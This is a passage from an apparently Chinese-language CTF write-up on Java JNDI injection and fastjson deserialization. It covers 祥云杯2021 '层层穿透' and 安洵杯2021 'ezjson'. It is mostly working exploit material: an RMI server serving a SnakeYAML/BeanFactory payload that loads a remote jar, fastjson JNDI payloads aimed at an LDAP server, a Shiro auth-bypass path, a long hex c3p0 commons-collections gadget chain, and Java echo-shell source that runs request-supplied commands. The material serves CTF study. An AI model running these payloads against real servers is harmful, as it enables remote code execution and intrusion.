import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class SnakeYamlServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);

        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:8000/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        resourceRef.add(new StringRefAddr("forceString", "x=load"));
        resourceRef.add(new StringRefAddr("x",yaml));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);

        registry.bind("yaml", referenceWrapper);
        System.out.println("rmi://127.0.0.1:1099/yaml");
    }
}
```


参考：
[Tomcat下JNDI高版本绕过浅析 ](https://xz.aliyun.com/t/10829)
[探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)
[探索高版本 JDK 下 JNDI 漏洞的利用方法：第二章](https://tttang.com/archive/1489/)
[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)
[JNDI注入利用原理及绕过高版本JDK限制](https://blog.csdn.net/mole_exp/article/details/121141042)
[java高版本下各种JNDI Bypass方法复现](https://www.cnblogs.com/bitterz/p/15946406.html)
[高版本JDK下的JNDI注入浅析](https://xz.aliyun.com/t/10671)

## 题目复现
### [祥云杯2021]层层穿透
直接看web.jar，反编译一下，可以看到fastjson版本为1.2.24
![](https://img-blog.csdnimg.cn/3dd2d811bde5426380cb4f971faf1be4.png)

并且存在shiro，版本为1.4，需要登录为admin，发现给出了密码：123456
![](https://img-blog.csdnimg.cn/f538bb68d6d946dabb54b99571af2dc9.png)
直接POST登录就可以了，其实也可以绕过shiro，[shiro 登录认证绕漏洞汇总](https://www.cnblogs.com/flashine/articles/14377015.html)，即：`/;/admin/test/`
接下来就是fastjson反序列化
![](https://img-blog.csdnimg.cn/6e737686aa574673819aad111553467c.png)
可以看到过滤了`JdbcRowSetImpl`和`TemplatesImpl`，并且16进制和unicode编码也被过滤了，我们还可以使用：
```json
{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho","loginTimeout":0,"f":"a*20000"}
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory","jndiNames":["ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho"],"Realms":[""],"a":"a*20000"}
```
由于存在长度判断，需要填充2w脏数据
图方便使用工具`JNDIExploit-1.2-SNAPSHOT.jar`，用TomcatEcho输出回显，成功执行命令
![](https://img-blog.csdnimg.cn/4c160c9a23d74e75843b8e0f20fd8ed6.png)
继续分析发现存在c3p0-0.9.5.2.jar，那么就可以通过c3p0 二次反序列化 cc payload
参考：[https://github.com/depycode/fastjson-c3p0](https://github.com/depycode/fastjson-c3p0)
```
POST /admin/test HTTP/1.1

cmd: whoami

{"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;"},"a":"a*10000"}
```
![](https://img-blog.csdnimg.cn/5f1e6141c70343b49dac10ad0db8c82c.png)
也可以使用bcel回显，就很简单了


参考：
[第二届"祥云杯" WEB WP ](https://www.anquanke.com/post/id/251221)
[祥云杯2021web writeup](https://blog.csdn.net/qq_41636200/article/details/119958733)

### [安洵杯2021]ezjson
任意文件下载 `file=/proc/self/fd/5` 获得源码
![](https://img-blog.csdnimg.cn/e35ea180ea9d4b088b861e197c6fdfcc.png)
发现为fastjson1.2.47，查看源码发现一个反序列化的入口
![](https://img-blog.csdnimg.cn/a107ea177d38410bb4e4148b625742e7.png)
存在过滤，使用16进制绕过即可，题目本身留了加载字节码后门，会调用Exec方法
![](https://img-blog.csdnimg.cn/762a043352f24d638f15abd4254ab3aa.png)
因为用的是parse来进行反序列化，我们可以用`$ref`来调用getter，触发getFlag()
参考：[利用 fastjson $ref 构造 poc](https://paper.seebug.org/1613/)
构造命令执行回显
```java
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;

public class EchoPayload{
    static {
        HttpServletRequest request =((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getResponse();
        String resHeader=request.getParameter ( "cmd" );
        java.io.InputStream in = null;
        try {
            in = Runtime.getRuntime().exec(resHeader).getInputStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
        BufferedReader br = null;
        try {
            br = new BufferedReader (new InputStreamReader(in, "GBK"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        String line = null;
        StringBuilder sb = new StringBuilder();
        while (true) {
            try {
                if (!((line = br.readLine()) != null)) break;
            } catch (IOException e) {
                e.printStackTrace();
            }
            sb.append(line);
            sb.append("\n");
        }
        java.io.PrintWriter out = null;
        try {
            out = new java.io.PrintWriter(response.getOutputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }
        out.write(sb.toString ());
        out.flush();
        out.close();
    }
    public void Exec(String cmd)throws Exception{
        Runtime.getRuntime().exec(cmd);
    }
}
```
最后生成16进制字节码，传入即可
```json
{
    "name":{
        "@type":"java.lang.Class",
        "val":"\x41\x70\x70\x2e\x45\x78\x65\x63"
    },
        "y":{
         "@type":"com.alibaba.fastjson.JSONObject",
             "c": {
                   "@type":"\x41\x70\x70\x2e\x45\x78\x65\x63",
                   "ClassByte":x'code',
                   "$ref":"$.y.c.flag"
                 }
       }
}
```
成功执行命令
![](https://img-blog.csdnimg.cn/b061e8bfcada4e018c760a2848af26df.png)
参考：
[安洵杯2021 官方Writeup(Web|Misc|Crypto) - D0g3](https://xz.aliyun.com/t/10616)
[2021安洵杯ezjson-wp](https://blog.csdn.net/fmyyy1/article/details/121674546)
